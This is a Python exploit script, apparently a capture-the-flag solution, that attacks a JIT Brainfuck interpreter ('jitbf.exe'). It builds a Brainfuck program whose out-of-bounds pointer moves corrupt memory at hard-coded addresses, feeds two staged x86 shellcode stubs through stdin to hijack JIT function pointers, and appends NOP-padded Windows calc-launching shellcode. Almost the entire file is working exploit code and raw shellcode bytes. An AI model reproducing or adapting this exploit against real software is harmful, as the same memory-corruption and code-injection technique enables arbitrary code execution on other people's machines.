##### python3 code
# Author: cudak
import os,sys,subprocess

"""
"""

# from https://intellij-support.jetbrains.com/hc/en-us/community/posts/206594585-Debugging-of-subprocess-popen-has-unexpected-results-and-fails
def ExecuteCommand(cmd, cwd = None, stdin_bytes = None):
	stdout = ""
	stderr = ""

	if cwd is not None:
		cwd = os.path.realpath(cwd)
		if not os.path.exists(cwd):
			print( "***ERROR*** - Current working directory [%s] does not exist and therefore cannot execute command [%s]" % (cwd, cmd), {"status": "failed"})
			sys.exit(1)
	try:
		if stdin_bytes != None:
			process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, cwd=cwd)
			(stdout, stderr) = process.communicate(input=stdin_bytes)
			return (process.returncode, stdout.decode("cp437"), stderr.decode("cp437"))
		else:
			process = subprocess.run(cmd, shell=True, cwd=cwd)
			return (process.returncode, "", "")
	except OSError as ex:
		return (ex.errno, "", ex.strerror)

def append_txt(f, txt):
	f += txt.encode('utf-8')

def append_int(f, i):
	f.append(i)

# ctx.ptr => 0xffc1df58
mystdin = bytearray()
sample_file = bytearray()

# Sample data: shold be "portable". Offsets are important.

ctx_addr         = 0x4120a0
jit_ptr_dec_addr = 0x412068
jit_ptr_inc_addr = 0x412050

# Move ptr
# Mess with C++ string
# Expected layout:
# [ptr_to_data] 4 bytes
# [size] 4 bytes
# [data OR capacity] 16 bytes

offset_move_old = ctx_addr + 4 + 4 - (jit_ptr_inc_addr + 4 + 4 + 16)
offset_move = ctx_addr + 4 + 4 - (jit_ptr_dec_addr + 4 + 4 + 16)

#bf_addr =  0x28ff14
#esp_addr = 0x28fef0
#shellcode_src = "83 C4 50 B8 77 B1 29 77 FF D0"
##                                     ^^
##                           This changes with reboot.

shellcode_src1 = "8B 7C 24 14 8B 74 24 50 83 C6 79 90 90 90 EB 0A"
shellcode_src2 = "83 C7 36 66 B9 FF 00 F3 A4 90 90 90 90 90"
# Hang: EB FE

shellcode1 = [int(i, 16) for i in shellcode_src1.split()]
shellcode2 = [int(i, 16) for i in shellcode_src2.split()]
#print(shellcode)
#shellcode1.append(0x90)
if len(shellcode1) != 16:
	print("Shellcode1 bad size!",len(shellcode1))
	exit()
if len(shellcode2) != 14:
	print("Shellcode2 bad size!",len(shellcode2))
	exit()

print("MOVING FOR ", offset_move)
append_txt(sample_file, "<" * offset_move)

# Write exploit: part 2
for i in range(14):
	append_txt(sample_file, "<,")
	append_int(mystdin, shellcode2[14 - 1 - i])

append_txt(sample_file, "<" * 10)
# Write explot: part 1
for i in range(16):
	append_txt(sample_file, "<,")
	append_int(mystdin, shellcode1[16 - 1 - i])

append_txt(sample_file, "<<<<,")
append_int(mystdin, 0x28)

# Trigger exploit
append_txt(sample_file, "(^>^)")
append_int(sample_file, 0)

# Shellcode in file
# Taken from https://github.com/peterferrie/win-exec-calc-shellcode/blob/master/w32-exec-calc-shellcode.asm
shellcode_file_src = "31 D2 52 68 63 61 6C 63 54 59 52 51 64 8B 72 30 8B 76 0C 8B 76 0C AD 8B 30 8B 7E 18 8B 5F 3C 8B 5C 3B 78 8B 74 1F 20 01 FE 8B 54 1F 24 0F B7 2C 17 42 42 AD 81 3C 07 57 69 6E 45 75 F0 8B 74 1F 1C 01 FE 03 3C AE FF D7 EB FE";
shellcode_file = [int(i, 16) for i in shellcode_file_src.split()]

while len(shellcode_file) < 255:
	shellcode_file.append(0x90)
	#append_int(sample_file, 0xcc)
if len(shellcode_file) > 255:
	print("shellcode_file bad size!")
	exit()
for i in shellcode_file:
	append_int(sample_file, i)

# Write file
sample = open("sample.bf", "wb")
sample.write(sample_file)
sample.close()
command = ['.\\jitbf.exe', 'sample.bf']

#exit()
process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
process.stdin.write(mystdin)
(stdout, stderr) = process.communicate()
print("DONE")